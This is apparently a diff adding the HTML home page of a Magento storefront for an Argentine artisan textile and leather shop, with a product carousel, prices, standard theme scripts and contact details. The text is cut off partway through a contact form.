+<p><a title="#" href="#"> <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/banner-img2.jpg" alt="banner img2" /> </a></p>
+<!--<div class="caption light2 top-right">-->
+<div class="caption light1 top-right">
+<div class="caption-inner">
+<p class="normal-text" >CARTERAS DE CUERO</p>
+<h2 class="heading permanent">Confección de calidad</h2>
+<p class="normal-text1" style="line-height: 1.3em; letter-spacing: 0px; text-transform: none;"></p>
+</div>
+</div>
+</li>
+</ul>
+<a id="home-slides-prev" class="backward browse-button" href="#">previous</a> <a id="home-slides-next" class="forward browse-button" href="#">next</a>
+<div id="home-slides-pager" class="tab-pager tab-pager-img tab-pager-ring-lgray">&nbsp;</div>
+</div>
+</div><!-- Header block call -->
+       <div class="service-section"><div id="store-messages" class="messages-3">
+<ul>
+<li><div class="message"><em class="icon-magic">&nbsp;</em> <span><strong>Diseños Exclusivos</strong>  </span></div></li>
+<li><div class="message"><em class="icon-comment">&nbsp;</em><span><strong>Prendas a Pedido</strong></span></div></li>
+<li><div class="message"><em class="icon-cut">&nbsp;</em><span><strong>Trabajos Hechos a Mano</strong> </span></div></li>
+<li><div class="message"><em class="icon-star">&nbsp;</em><span><strong>Artículos de Alta Calidad</strong> </span></div></li>
+</ul>
+</div></div>       <div class="offer-banner">
+<div class="offer-banner-section">
+<div class="col"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/offer-banner1.png" alt="offer banner1" /></div>
+<div class="col-mid"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/offer-banner2.png" alt="offer banner2" /></div>
+<div class="col last">
+<div class="add_img"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/offer-banner3.png" alt="offer banner3" /></div>
+<div><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/offer-banner4.png" alt="offer banner4" /></div>
+</div>
+</div>
+</div>       <section class="main-col">  
+          <article>             
+              
+               
+                            <div class="std"><div>        <p class="note-msg">No hay liquidaciones en este momento.</p>
+          <!--Endif !$collection->count() -->
+
+<div id="mgkquickview">
+<div id="magikloading" style="display:none;text-align:center;margin-top:400px;"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/mgkloading.gif" alt="loading">
+</div></div>
+<script type="text/javascript">
+function callQuickView(qurl) { 
+    jQuery('#mgkquickview').show();
+    jQuery('#magikloading').show();
+    jQuery.get(qurl, function(data) {
+      jQuery.fancybox(data);
+      jQuery('#magikloading').hide();
+jQuery('#mgkquickview').hide();
+    });
+ }
+ 
+</script>
+</div>
+<div>
+<div class="featured-slider">
+  <div class="new_title center">
+    <h2><span>Productos Destacados</span></h2>
+  </div> <!--new_title center-->
+
+
+<a id="products_slider_prev" class="jcarousel-prev-horizontal2" href="#"></a> <a id="products_slider_next" class="jcarousel-next-horizontal2" href="#"></a>
+<div class="jcarousel-skin-tango5">
+  <div class="jcarousel-container jcarousel-container-horizontal" style="position: relative; display: block;">
+    <div class="jcarousel-clip jcarousel-clip-horizontal" style="overflow: hidden; position: relative;">
+      <ul id="featured_products_slider" class="products-grid jcarousel-list jcarousel-list-horizontal" style="overflow: hidden; position: relative; top: 0px; margin: 0px; padding: 0px; left: 0px; width: 2460px;">
+                            
+          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal first1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/cartera-con-guarda-219.html" title="Ruana Telar a Pala" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/r/u/ruana_telar_a_pala3-gr.jpg" alt="Ruana Telar a Pala" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/6/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/cartera-con-guarda-219.html" title="Ruana Telar a Pala">
+                  Ruana Telar a Pala             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-6">
+                                            <span class="price">7 837,00 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/6/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/6/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  odd1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/spolverino.html" title="Spolverino" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/6/_/6.jpg" alt="Spolverino" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/41/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/spolverino.html" title="Spolverino">
+                  Spolverino             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-41">
+                                            <span class="price">7 837,00 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/41/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/41/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  odd1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/chaleco-rustico-con-cordon-natural.html" title="Chaleco Rústico con Cordón Natural" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/c/h/chaleco_rustico_con_cordon5-gr.jpg" alt="Chaleco Rústico con Cordón Natural" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/8/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/chaleco-rustico-con-cordon-natural.html" title="Chaleco Rústico con Cordón Natural">
+                  Chaleco Rústico con Cordón N...             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-8">
+                                            <span class="price">1 613,50 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/8/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/8/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  last1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/chaleco-rustico-con-cordon-marron.html" title="Chaleco Rústico con Cordón Marrón " class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/c/h/chaleco_rustico_con_cordon6-gr.jpg" alt="Chaleco Rústico con Cordón Marrón " /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/9/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/chaleco-rustico-con-cordon-marron.html" title="Chaleco Rústico con Cordón Marrón ">
+                  Chaleco Rústico con Cordón M...             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-9">
+                                            <span class="price">1 613,50 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/9/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/9/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                        
+                  
+                                    
+          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal first1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/cartera-serpiente-negro.html" title="Cartera Serpiente Negro" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/s/e/serpiente_negro-ch_1.jpg" alt="Cartera Serpiente Negro" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/10/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/cartera-serpiente-negro.html" title="Cartera Serpiente Negro">
+                  Cartera Serpiente Negro             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-10">
+                                            <span class="price">1 659,60 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/10/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/10/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  odd1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/cartera-vasija-negra.html" title="Cartera Vasija negra" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/v/a/vasija_negra-gr.jpg" alt="Cartera Vasija negra" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/11/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/cartera-vasija-negra.html" title="Cartera Vasija negra">
+                  Cartera Vasija negra             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-11">
+                                            <span class="price">1 705,70 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/11/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/11/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  odd1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/cartera-vasija-redonda-tostado.html" title="Cartera Vasija Redonda Tostado" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/v/a/vasija_redondo_tostado-ch.jpg" alt="Cartera Vasija Redonda Tostado" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/12/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/cartera-vasija-redonda-tostado.html" title="Cartera Vasija Redonda Tostado">
+                  Cartera Vasija Redonda Tostado             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-12">
+                                            <span class="price">1 705,70 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/12/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/12/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                  
+                          
+    <li class="item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal  last1">
+   <div class="item-inner">
+      <div class="item-img">
+        <div class="item-img-info">
+           <a href="http://juanartesano.com/cartera-vasija-redonda-rojo-vino.html" title="Cartera Vasija Redonda Rojo Vino" class="product-image"><img src="http://juanartesano.com/media/catalog/product/cache/1/small_image/265x322/9df78eab33525d08d6e5fb8d27136e95/v/a/vasija-redondo-rojo-vino-ch.jpg" alt="Cartera Vasija Redonda Rojo Vino" /></a>
+                      <div class="item-box-hover">
+              <div class="box-inner">
+                 <div class="product-detail-bnt">
+                                           <a data-fancybox-type="ajax" onclick="callQuickView('http://juanartesano.com/accordsettings/index/view/id/13/');" title="Vista Rápida" class="button detail-bnt"><span>Vista Rápida</span></a>                    
+                                           
+                 </div> <!--product-detail-bnt-->
+              </div> <!--box-inner-->
+           </div> <!--item-box-hover-->
+        </div> <!--item-img-info-->
+      </div> <!--item-img-->
+
+      <div class="item-info">
+        <div class="info-inner">
+          <div class="item-title">
+             <a href="http://juanartesano.com/cartera-vasija-redonda-rojo-vino.html" title="Cartera Vasija Redonda Rojo Vino">
+                  Cartera Vasija Redonda Rojo Vi...             </a>
+          </div> <!--item-title-->
+          <div class="item-content">
+              
+                            <div class="ratings"><div class="rating-box"><div style="width:0%" class="rating"></div></div></div>
+                                <div class="item-price">
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-13">
+                                            <span class="price">1 705,70 AR$</span>                                    </span>
+                        
+        </div>
+
+</div>
+          </div> <!--item-content-->
+        </div> <!--info-inner-->
+        <div class="actions">
+         <span class="add-to-links">
+            <a href="http://juanartesano.com/wishlist/index/add/product/13/form_key/nDziKMbdnATJjooi/" class="link-wishlist" title="Agregar a la lista de artículos de interés"><span>Agregar a la lista de artículos de interés</span></a>
+                          <button type="button"  title="Agregar al carrito" class="button btn-cart" onclick="setLocation('http://juanartesano.com/checkout/cart/add/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/product/13/form_key/nDziKMbdnATJjooi/')"><span>Agregar al carrito</span></button>
+                        <a href="" class="link-compare" title="Agregar a la lista de comparación"><span>Agregar a la lista de comparación</span></a>
+         </span> <!--add-to-links-->
+        </div> <!--actions-->
+      </div> <!--item-info-->                                   
+   </div> <!--item-inner-->
+</li> <!--item jcarousel-item jcarousel-item-horizontal jcarousel-item-1 jcarousel-item-1-horizontal-->   
+                        
+                  
+                 
+       </ul>
+     </div> <!--jcarousel-clip jcarousel-clip-horizontal-->
+  </div> <!--jcarousel-container jcarousel-container-horizontal-->
+</div> <!--jcarousel-skin-tango5-->
+        <!--Endif !$collection->count() -->
+</div> <!--featured-slider-->
+ <!-- chk attribute_code -->
+
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+
+        function mycarousel_initCallback(carousel) {
+
+            $('#products_slider_next').bind('click', function() {
+                carousel.next();
+                return false;
+            });
+            $('#products_slider_prev').bind('click', function() {
+                carousel.prev();
+                return false;
+            });
+        };
+
+    $('#featured_products_slider').jcarousel({
+            scroll: 1,
+        initCallback: mycarousel_initCallback,
+            buttonNextHTML: null,
+            buttonPrevHTML: null
+    });
+});
+</script>
+
+<div id="mgkquickview">
+<div id="magikloading" style="display:none;text-align:center;margin-top:400px;"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/mgkloading.gif" alt="loading">
+</div></div>
+<script type="text/javascript">
+function callQuickView(qurl) { 
+    jQuery('#mgkquickview').show();
+    jQuery('#magikloading').show();
+    jQuery.get(qurl, function(data) {
+      jQuery.fancybox(data);
+      jQuery('#magikloading').hide();
+jQuery('#mgkquickview').hide();
+    });
+ }
+ 
+</script></div></div>          </article>
+      </section> <!--main-col-->
+<!-- Home Lastest Blog Block -->
+      <!-- Static Banner Block -->
+      <section><div class="our-features-box"><div class="store-img-box">
+<ul>
+<li>
+<div class="feature-box">
+<div class="icon-magic">&nbsp;</div>
+<div class="content">Diseño Exclusivo <span>Tomamos pedidos de prendas únicas, no replicables y artesanales. Tenemos una amplia gama de productos o lo confeccionamos a medida. </span></div>
+</div>
+</li>
+<li>
+<div class="feature-box">
+<div class="icon-star">&nbsp;</div>
+<div class="content">Materiales de calidad <span>
+Trabajamos con hilados teñidos con elementos naturales y cuero argentino vacuno de primera calidad.</span></div>
+</div>
+</li>
+<li class="last">
+<div class="feature-box">
+<div class="icon-support">&nbsp;</div>
+<div class="content">Atención profesional <span>
+Conocemos cómo trabajar con artesanos y tiendas comerciales en Argentina y el mundo. Nuestros clientes son particulares y mayoristas.</span></div>
+</div>
+</li>
+</ul>
+</div></div></section>
+<!-- Logo Brand Block -->
+      
+
+<section>
+       </section>
+
+<footer>
+
+<div class="footer informative">
+
+<!-- BEGIN INFORMATIVE FOOTER -->  
+  <div class="inner">
+<div class="footer-column-1">
+<div class="footer-logo"><a title="Logo" href="#"><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/logo1.png" alt="footer  logo" /></a></div>
+<address><em class="add-icon">&nbsp;</em>Bolonia 53 esq. Cadiz <br /> &nbsp;Mendiolaza, CP: 5107, Argentina</address>
+<div class="phone-footer"><em class="phone-icon">&nbsp;</em> 54 03543 595924</div>
+<div class="email-footer"><em class="email-icon">&nbsp;</em> <a href="mailto:info@juanartesano.com">info@juanartesano.com</a></div>
+
+</div><div class="footer-column">
+<h4>Nosotros</h4>
+<ul class="links">
+<li class="first"><a title="about-us" href="about-us">Acerca de nosotros</a></li>
+<li><a title="Telar Criollo" href="criollo">Telar Criollo</a></li>
+<li><a title="Telar de Peine y Bastidor" href="peinebastidor">Telar de Peine y Bastidor</a></li>
+<!--<li><a title="Shipment" href="#">Envío</a></li>
+<li><a title="Where is my order?" href="#">Where is my order?</a></li>
+<li class="last"><a title="Return policy" href="#">Return policy</a></li>-->
+</ul>
+</div>
+<div class="footer-column">
+<h4>Información</h4>
+<ul class="links">
+<li class="first"><a title="Your Account" href="http://juanartesano.com/customer/account/">Tu cuenta</a></li>
+<!--<li><a title="Information" href="#">Information</a></li>
+<li><a title="Addresses" href="#">Direcciones</a></li>
+<li><a title="Addresses" href="#">Descuentos</a></li>
+<li><a title="Orders History" href="#">Historial de pedidos</a></li>
+<li class="last"><a title=" Additional Information" href="#">Información Adicional</a></li>-->
+</ul>
+</div>
+<div class="footer-column">
+<h4>Sitio</h4>
+<ul class="links">
+<li class="first"><a title="Site Map" href="http://juanartesano.com/catalog/seo_sitemap/category/">Mapa de Sitio</a></li>
+<li><a title="Search Terms" href="http://juanartesano.com/catalogsearch/term/popular/">Terminos de Busqueda</a></li>
+<li><a title="Advanced Search" href="http://juanartesano.com/catalogsearch/advanced/">Busqueda Avanzada</a></li>
+<!--<li><a title="History" href="# ">History</a></li>
+<li><a title="Suppliers" href="#">Proveedores</a></li>
+<li class=" last"><a class="link-rss" title="Our stores" href="#">Nuestra Tienda</a></li>-->
+</ul>
+</div>  <div class="footer-column-last">
+     <h4>Dejanos tu correo</h4>
+<div class="newsletter">
+    <form action="http://juanartesano.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail1">
+      <div id="container_form_news">
+        <div id="container_form_news2">
+           <input type="text" name="email" id="newsletter" title="Apuntarse a nuestro boletín de noticias" class="input-text required-entry validate-email" placeholder="Enter your email address" />                              
+           <button type="submit" title="Subscribirse" class="button subscribe"><span>Enviar</span></button>
+        </div>
+      </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail1');
+    //]]>
+    </script>
+</div> <!--newsletter-->
+
+
+
+
+      </div> <!--footer-column-last-->
+</div> <!--inner-->
+
+<div class="footer-bottom">
+<div class="inner">
+<div class="coppyright">Copyright &copy; 2014. All Rights Reserved. Designed by <a style="color:#F03C02;" href="https://inglobe.com.ar" target="_blank">Inglobe</a></div>
+<!--<div class="bottom_links">
+<ul class="links">
+<li><a title="Magento Themes" href="http://www.magikcommerce.com/magento-themes-templates">Magento Themes</a></li>
+<li><a title="Responsive Themes" href="http://www.magikcommerce.com/magento-themes-templates/responsive-themes">Responsive Themes</a></li>
+<li class="last"><a title="Magento Extensions" href="http://www.magikcommerce.com/magento-extensions">Magento Extensions</a></li>
+</ul>
+</div>-->
+</div>
+</div>
+<!-- BEGIN SIMPLE FOOTER -->  
+           
+
+</div> <!--footer-->
+
+</footer>
+
+<div class="orange-slider">
+  <div class="text alignleft">Contactanos</div>
+  <div class="icons">
+    <a  class="show_hide" id="questionbox-side-phonebutton" href="javascript:void(0)"><i class="icon-phones"></i></a>
+    <a class="show_hide1" id="questionbox-side-emailbutton" href="javascript:void(0)"><i style="font-size:20px" class="icon-email"></i></a> 
+  </div> <!--icons-->
+</div> <!--orange-slider-->
+
+<div id="hideShow" style="text-align:left;display:none">
+<div class="right-side-content hidden1">
+   <!--Contact Static Block -->
+   <div class="slider-phone active">
+<h2>CONTACTANOS!</h2>
+<h3>DISPONIBLES 24/7</h3>
+<p class="textcenter">Llamanos en caso de consultas<br /> <br /> <span class="phone-number"> 54 0351 156169164 </span></p>
+</div> 
+   <a href="javascript:void(0)" id="hideDiv" class="slider-close"></a>
+</div> <!--right-side-content hidden1-->
+</div> <!--#hideShow-->
+
+<!-- Contact Us Form -->
+<div id="hideShow1" style="text-align:left;display:none">
+  <div class="right-side-content hidden1">
+
+  <div class="slider-email active">
+
+<div id="messages_product_view"></div>
+<div id="formSuccess" style="display:none;">Su consulta se ha enviado y se responderá con la mayor brevedad. Gracias por contactar con nosotros.</div>
+<form action="" id="contactForm" method="post">
+
+
+  <div class="column sixty">
+      <h2>Escribinos!</h2>
+
+        <ul>
+            <li>
+                    <label for="name">Nombre<em class="required">*</em></label>
+                    <input name="name" id="name" title="Nombre" value="" class="input-text required-entry" type="text" />
+            </li>
+            <li>
+                    <label for="email">Correo electrónico<em class="required">*</em></label>
